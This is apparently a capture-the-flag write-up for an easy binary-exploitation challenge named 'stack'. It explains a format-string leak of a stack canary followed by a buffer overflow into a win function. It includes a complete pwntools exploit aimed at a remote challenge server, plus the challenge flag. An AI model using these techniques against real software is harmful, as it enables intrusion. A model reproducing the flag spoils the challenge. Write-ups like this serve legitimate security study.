# stack

> **Category**: PWN | **Difficulty**: Easy | **Competition**: ISCC 2026 School
> **Flag**: `ISCC{e8c874b2-8cd2-4921-8d80-899157acd562}`

---

## Attack Chain

```
格式化字符串泄露canary → 带正确canary栈溢出 → ret2win跳转getshell
```

## Key Techniques

### 1. 格式化字符串泄露 Canary

vuln循环2次, 第一次 `printf(buf)` 泄露栈数据:

```
Offset 1-5:   栈帧数据
Offset 6-30:  buffer内容 (25×4=100字节)
Offset 31:    ★ canary ★ (最低字节必为0x00)
Offset 32-33: 栈帧数据
```

发送 `%p.` × 33 → 提取第31个值为canary。

### 2. 栈溢出 ret2win

```python
payload = b'A' * 100        # 填充buffer
payload += p32(canary)       # 写回正确canary
payload += b'B' * 12         # padding
payload += p32(0x080491c6)   # getshell地址
```

### 3. 关键点

- `read(0, buf, 0x200)` 读取512字节到100字节缓冲区 = 溢出
- 循环2次 = 2次机会, 先泄露后利用
- canary最低字节=0x00 (Linux特性)

## Exploit

```python
from pwn import *
r = remote('39.96.193.120', 10018)
r.recvuntil(b'Hello Hacker!\n')

# 第1次: 泄露canary (offset 31)
r.sendline(b'%p.' * 33)
resp = r.recvline()
canary = int(resp.decode().split('.')[30], 16)

# 第2次: 溢出到getshell
payload  = b'A' * 100 + p32(canary) + b'B' * 12 + p32(0x080491c6)
r.sendline(payload)
r.sendline(b'cat /flag*')
```

## Distilled Knowledge

| 知识点 | 关键 |
|--------|------|
| 格式化字符串 | `%p.` 泄露栈数据, 定位canary offset |
| Canary特性 | 最低字节必为0x00 |
| ret2win | 程序自带win函数直接跳转 |
| 双漏洞组合 | 循环N次 = N次机会, 先泄露后利用 |

---

*Original writeup: `C:\Users\48714\Desktop\wp\校赛\stack_wp.md`*
